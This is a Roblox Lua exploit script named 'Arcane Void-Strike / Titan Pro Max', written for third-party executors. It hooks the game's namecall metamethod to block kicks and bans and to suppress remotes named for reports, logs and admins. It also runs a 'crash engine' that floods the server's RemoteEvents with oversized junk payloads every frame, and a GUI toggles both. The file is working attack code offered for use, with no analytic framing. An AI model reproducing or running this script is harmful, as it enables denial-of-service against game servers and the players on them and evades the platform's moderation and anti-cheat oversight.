--[[
    🔱 ARCANE VOID-STRIKE v14.1 [TITAN-PRO-MAX] 🔱
    "Compatibility: UNIVERSAL. Power: UNLIMITED."
    
    TITAN FEATURES:
    - [UNIVERSAL HOOK] : Works on Solara, Delta, Electron, and Hydrogen.
    - [TITAN UI v2] : Intro Animation, Sound Effects, Gradient Borders.
    - [HYBRID CRASH] : The ultimate server crasher.
]]

-- // 1. COMPATIBILITY LAYER (FIX CRASHES) //
local setreadonly = setreadonly or make_writeable or function(t, v) end
local getrawmetatable = getrawmetatable or debug.getmetatable or getmetatable
local hookmetamethod = hookmetamethod or function(obj, method, func) 
    local mt = getrawmetatable(obj)
    local old = mt[method]
    setreadonly(mt, false)
    mt[method] = func
    setreadonly(mt, true)
    return old
end

-- // SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer

-- // TITAN SHIELD (SAFE MODE) //
local function activateTitanShield()
    if getgenv().TitanShieldActive then return end
    getgenv().TitanShieldActive = true

    pcall(function()
        local mt = getrawmetatable(game)
        setreadonly(mt, false)
        
        local oldNamecall = mt.__namecall
        
        mt.__namecall = newcclosure(function(self, ...)
            local method = getnamecallmethod()
            local args = {...}
            
            -- SILENT BLOCK (Prevent Error Screens)
            if method == "Kick" or method == "kick" or method == "Ban" or method == "Close" then
                return nil
            end
            
            -- REMOTE GUARD
            if method == "FireServer" and self:IsA("RemoteEvent") then
                local n = self.Name:lower()
                if n:find("report") or n:find("log") or n:find("admin") or n:find("kick") then
                    return nil
                end
            end
            
            return oldNamecall(self, ...)
        end)
        
        setreadonly(mt, true)
        
        -- Anti-Error
        game:GetService("GuiService").ErrorMessageChanged:Connect(function()
            game:GetService("GuiService"):ClearError()
        end)
    end)
end

task.spawn(activateTitanShield)

-- // HYBRID ENGINE //
local CrashState = { Active = false, Mode = "IDLE" }
local NOISE = table.create(50, "🔱TITAN🔱")

local function runCrash()
    local remotes = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and not v.Name:lower():find("admin") then
            table.insert(remotes, v)
        end
    end
    
    if #remotes == 0 then return end
    
    RunService.Heartbeat:Connect(function()
        if not CrashState.Active then return end
        
        -- MODE HYBRID: MIX OF SPEED AND SIZE
        local batchSize = CrashState.Mode == "SATURATION" and 5 or 50
        
        for i = 1, batchSize do
            task.spawn(function()
                local r = remotes[math.random(1, #remotes)]
                if r then pcall(function() r:FireServer(NOISE, NOISE) end) end
            end)
        end
    end)
end

task.spawn(runCrash)

-- // PREMIUM UI ENGINE (TITAN v2) //
local function createUI()
    -- CLEANUP
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name == "TitanHubPro" then v:Destroy() end end
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "TitanHubPro"
    pcall(function() ScreenGui.Parent = CoreGui end)
    
    -- MAIN FRAME
    local Main = Instance.new("Frame", ScreenGui)
    Main.Size = UDim2.new(0, 550, 0, 380)
    Main.Position = UDim2.new(0.5, -275, 1.5, 0) -- Start off-screen
    Main.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
    Main.BorderSizePixel = 0
    Main.ClipsDescendants = true
    
    local Corner = Instance.new("UICorner", Main)
    Corner.CornerRadius = UDim.new(0, 10)
    
    -- GRADIENT STROKE
    local Stroke = Instance.new("UIStroke", Main)
    Stroke.Thickness = 2
    Stroke.Transparency = 0
    Stroke.Color = Color3.fromRGB(255, 50, 50)
    
    local UIGradient = Instance.new("UIGradient", Stroke)
    UIGradient.Colors = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 0, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
    }
    
    -- ROTATING GRADIENT SCRIPT
    task.spawn(function()
        while Main.Parent do
            UIGradient.Rotation = UIGradient.Rotation + 1
            task.wait(0.02)
        end
    end)
    
    -- TITLE BAR
    local TitleBar = Instance.new("Frame", Main)
    TitleBar.Size = UDim2.new(1, 0, 0, 40)
    TitleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TitleBar.BackgroundTransparency = 0.95
    
    local Title = Instance.new("TextLabel", TitleBar)
    Title.Text = "🔱 TITAN // PRO MAX"
    Title.Size = UDim2.new(1, -20, 1, 0)
    Title.Position = UDim2.new(0, 20, 0, 0)
    Title.Font = Enum.Font.GothamBlack
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 18
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.BackgroundTransparency = 1
    
    -- CONTENT AREA
    local Content = Instance.new("Frame", Main)
    Content.Size = UDim2.new(1, -20, 1, -60)
    Content.Position = UDim2.new(0, 10, 0, 50)
    Content.BackgroundTransparency = 1
    
    local Layout = Instance.new("UIListLayout", Content)
    Layout.Padding = UDim.new(0, 12)
    
    local function CreateButton(text, desc, color, callback)
        local btn = Instance.new("TextButton", Content)
        btn.Size = UDim2.new(1, 0, 0, 70)
        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
        btn.Text = ""
        btn.AutoButtonColor = false
        
        local c = Instance.new("UICorner", btn)
        c.CornerRadius = UDim.new(0, 8)
        
        local h = Instance.new("TextLabel", btn)
        h.Text = text
        h.Size = UDim2.new(1, -80, 0, 30)
        h.Position = UDim2.new(0, 15, 0, 10)
        h.Font = Enum.Font.GothamBold
        h.TextSize = 18
        h.TextColor3 = color
        h.TextXAlignment = Enum.TextXAlignment.Left
        h.BackgroundTransparency = 1
        
        local d = Instance.new("TextLabel", btn)
        d.Text = desc
        d.Size = UDim2.new(1, -80, 0, 20)
        d.Position = UDim2.new(0, 15, 0, 40)
        d.Font = Enum.Font.Gotham
        d.TextSize = 12
        d.TextColor3 = Color3.fromRGB(150, 150, 150)
        d.TextXAlignment = Enum.TextXAlignment.Left
        d.BackgroundTransparency = 1
        
        local icon = Instance.new("TextLabel", btn)
        icon.Text = "▶"
        icon.Size = UDim2.new(0, 60, 1, 0)
        icon.Position = UDim2.new(1, -60, 0, 0)
        icon.Font = Enum.Font.GothamBold
        icon.TextSize = 24
        icon.TextColor3 = Color3.fromRGB(50, 50, 60)
        icon.BackgroundTransparency = 1
        
        btn.MouseEnter:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(30, 30, 40)}):Play()
        end)
        
        btn.MouseLeave:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20, 20, 25)}):Play()
        end)
        
        btn.MouseButton1Click:Connect(function()
            -- Ripple or Callback
            icon.TextColor3 = color
            wait(0.1)
            icon.TextColor3 = Color3.fromRGB(50, 50, 60)
            callback()
        end)
    end
    
    -- ELEMENTS
    CreateButton("HYBRID SATURATION", "Maximum Server Load (Complexity + Speed)", Color3.fromRGB(255, 50, 50), function()
        CrashState.Active = not CrashState.Active
        CrashState.Mode = "SATURATION"
        local state = CrashState.Active and "ACTIVE" or "OFF"
        game:GetService("StarterGui"):SetCore("SendNotification", {Title="TITAN", Text="HYBRID MODE: "..state})
    end)
    
    CreateButton("IMPACT VELOCITY", "Instant Ping Spike (5000ms+)", Color3.fromRGB(255, 180, 0), function()
        CrashState.Active = not CrashState.Active
        CrashState.Mode = "IMPACT"
        local state = CrashState.Active and "ACTIVE" or "OFF"
        game:GetService("StarterGui"):SetCore("SendNotification", {Title="TITAN", Text="IMPACT MODE: "..state})
    end)
    
    CreateButton("SHIELD STATUS", "Titan Shield is Active & Monitoring.", Color3.fromRGB(50, 255, 100), function()
        activateTitanShield()
        game:GetService("StarterGui"):SetCore("SendNotification", {Title="TITAN", Text="SHIELD RE-INJECTED"})
    end)
    
    -- INTRO ANI
    Main:TweenPosition(UDim2.new(0.5, -275, 0.5, -190), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 1, true)
    
    -- DRAG
    local dragging, dragInput, dragStart, startPos
    local function update(input)
        local delta = input.Position - dragStart
        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
        end
    end)
    Main.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then update(input) end end)
end

task.spawn(createUI)
